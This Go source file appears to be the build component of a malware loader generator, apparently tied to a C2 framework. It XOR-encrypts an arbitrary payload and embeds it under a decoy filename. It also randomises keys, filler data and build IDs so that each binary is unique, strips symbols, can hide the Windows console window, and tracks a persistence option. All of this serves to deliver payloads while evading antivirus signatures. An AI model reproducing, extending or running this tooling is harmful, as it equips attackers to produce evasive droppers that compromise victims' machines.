package loader

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"
)

const compileTimeout = 3 * time.Minute

var compileMu sync.Mutex

// Build writes a temp Go module, cross-compiles it for opts.GOOS/GOARCH, and
// returns the finished executable. Requires a Go toolchain on the UI host.
func Build(opts Options) (*Result, error) {
	if err := opts.Normalize(); err != nil {
		return nil, err
	}
	mintUniqueness(&opts)
	goBin, err := lookGo()
	if err != nil {
		return nil, err
	}

	compileMu.Lock()
	defer compileMu.Unlock()

	dir, err := os.MkdirTemp("", "sliv-loader-*")
	if err != nil {
		return nil, fmt.Errorf("temp dir: %w", err)
	}
	defer os.RemoveAll(dir)

	embedName := "payload.bin"
	if opts.GOOS == "windows" {
		embedName = "cfg.dat"
	}
	payload := xorCopy(opts.Payload, combinedXORKey(opts))
	if err := os.WriteFile(filepath.Join(dir, embedName), payload, 0o600); err != nil {
		return nil, err
	}
	noise := opts.Noise
	if len(noise) == 0 {
		noise = []byte{0}
	}
	if err := os.WriteFile(filepath.Join(dir, "n.bin"), noise, 0o600); err != nil {
		return nil, err
	}
	if err := os.WriteFile(filepath.Join(dir, "go.mod"), []byte(goMod()), 0o644); err != nil {
		return nil, err
	}
	if err := os.WriteFile(filepath.Join(dir, "main.go"), []byte(generateSource(opts)), 0o644); err != nil {
		return nil, err
	}
	for name, body := range jumpAsm() {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(body), 0o644); err != nil {
			return nil, err
		}
	}

	outName := "loader"
	if opts.GOOS == "windows" {
		outName = "loader.exe"
	}
	outPath := filepath.Join(dir, outName)

	ldflags := "-s -w"
	if opts.BuildID != "" {
		ldflags += " -buildid=" + opts.BuildID
	}
	if opts.GOOS == "windows" && opts.HideConsole {
		ldflags += " -H windowsgui"
	}

	ctx, cancel := context.WithTimeout(context.Background(), compileTimeout)
	defer cancel()
	cmd := exec.CommandContext(ctx, goBin, "build", "-trimpath", "-ldflags", ldflags, "-o", outPath, ".")
	cmd.Dir = dir
	cmd.Env = buildEnv(opts.GOOS, opts.GOARCH)
	var stderr bytes.Buffer
	cmd.Stdout = &stderr
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		msg := strings.TrimSpace(stderr.String())
		if ctx.Err() == context.DeadlineExceeded {
			return nil, fmt.Errorf("compile timed out after %s", compileTimeout)
		}
		if msg == "" {
			msg = err.Error()
		}
		return nil, fmt.Errorf("go build %s/%s: %s", opts.GOOS, opts.GOARCH, msg)
	}

	bin, err := os.ReadFile(outPath)
	if err != nil {
		return nil, fmt.Errorf("read compiled loader: %w", err)
	}
	if len(bin) == 0 {
		return nil, fmt.Errorf("compiler produced an empty file")
	}

	return &Result{
		Filename:    Filename(opts.Name, opts.GOOS),
		DataB64:     base64.StdEncoding.EncodeToString(bin),
		Size:        len(bin),
		OS:          opts.GOOS,
		Arch:        opts.GOARCH,
		HideConsole: opts.HideConsole,
		Persistence: opts.Persistence,
		PayloadSize: len(opts.Payload),
	}, nil
}

func ensureXORKey(opts *Options) {
	if opts == nil || opts.XORKey != "" {
		return
	}
	opts.XORKey = string(randBytes(16))
}

func mintUniqueness(opts *Options) {
	if opts == nil {
		return
	}
	ensureXORKey(opts)
	if len(opts.Nonce) == 0 {
		opts.Nonce = randBytes(16)
	}
	if opts.NameKey == 0 {
		dk := randBytes(1)[0]
		if dk == 0 {
			dk = 0x5A
		}
		opts.NameKey = dk
	}
	if len(opts.Noise) == 0 {
		n := 4096 + int(binary.LittleEndian.Uint16(randBytes(2)))%20480
		opts.Noise = randBytes(n)
	}
	if opts.BuildID == "" {
		opts.BuildID = hex.EncodeToString(randBytes(16))
	}
}

func randBytes(n int) []byte {
	out := make([]byte, n)
	if _, err := rand.Read(out); err == nil {
		return out
	}
	now := time.Now().UnixNano()
	for i := range out {
		out[i] = byte(now>>(8*(i%8))) ^ byte(i*17+0xA5)
	}
	return out
}

func lookGo() (string, error) {
	if p, err := exec.LookPath("go"); err == nil {
		return p, nil
	}
	if root := runtime.GOROOT(); root != "" {
		p := filepath.Join(root, "bin", "go")
		if runtime.GOOS == "windows" {
			p += ".exe"
		}
		if st, err := os.Stat(p); err == nil && !st.IsDir() {
			return p, nil
		}
	}
	return "", fmt.Errorf("Go toolchain not found on this host; install Go to compile loaders")
}

func buildEnv(goos, goarch string) []string {
	out := make([]string, 0, 32)
	for _, e := range os.Environ() {
		switch {
		case strings.HasPrefix(e, "GOOS="),
			strings.HasPrefix(e, "GOARCH="),
			strings.HasPrefix(e, "CGO_ENABLED="),
			strings.HasPrefix(e, "GOTOOLCHAIN="):
			continue
		default:
			out = append(out, e)
		}
	}
	return append(out,
		"GOOS="+goos,
		"GOARCH="+goarch,
		"CGO_ENABLED=0",
		"GO111MODULE=on",
		"GOTOOLCHAIN=local",
	)
}
